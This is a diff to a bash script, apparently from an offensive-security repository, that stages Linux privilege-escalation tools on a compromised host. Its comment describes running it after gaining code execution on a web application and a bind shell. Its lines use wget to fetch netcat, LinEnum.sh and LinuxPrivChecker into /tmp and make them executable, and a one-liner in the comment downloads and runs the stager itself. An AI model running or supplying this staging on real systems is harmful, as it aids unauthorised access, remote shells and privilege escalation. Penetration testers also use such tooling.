@@ -1,6 +1,6 @@
 #!/bin/bash
 # used to stage all appropriate tools needed for privesc + handles some base config setup
-# use: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh && chmod +x linux_stager.sh && ./linux_stager.sh 
+# use: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/git_linux_stager.sh && chmod +x git_linux_stager.sh && ./git_linux_stager.sh 
 # (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
 
 
@@ -10,13 +10,13 @@ echo "[]________________________________________________________________________
 
 # download NC
 echo "[*] Downloading NC to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -O /tmp/nc
-chmod +x /tmp/nc
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -O /tmp/nc && chmod +x /tmp/nc
+
 
 # download linenum.sh
 echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -O /tmp/linenum.sh
-chmod +x /tmp/linenum.sh
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
+
 
 # download LinxPrivChecker.py
 echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
